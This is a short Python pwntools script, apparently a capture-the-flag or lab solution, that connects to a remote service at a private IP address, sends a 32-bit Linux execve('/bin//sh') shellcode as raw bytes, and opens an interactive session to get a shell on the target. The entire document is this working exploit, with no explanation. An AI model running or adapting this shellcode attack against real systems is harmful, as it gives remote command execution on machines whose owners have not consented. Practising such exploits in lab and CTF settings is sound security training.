from pwn import *
context.arch = 'i386'
context.log_level = 'DEBUG'
p = remote("10.214.160.13",11003)
shell_code = b'\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80'
p.sendline(shell_code)
p.interactive()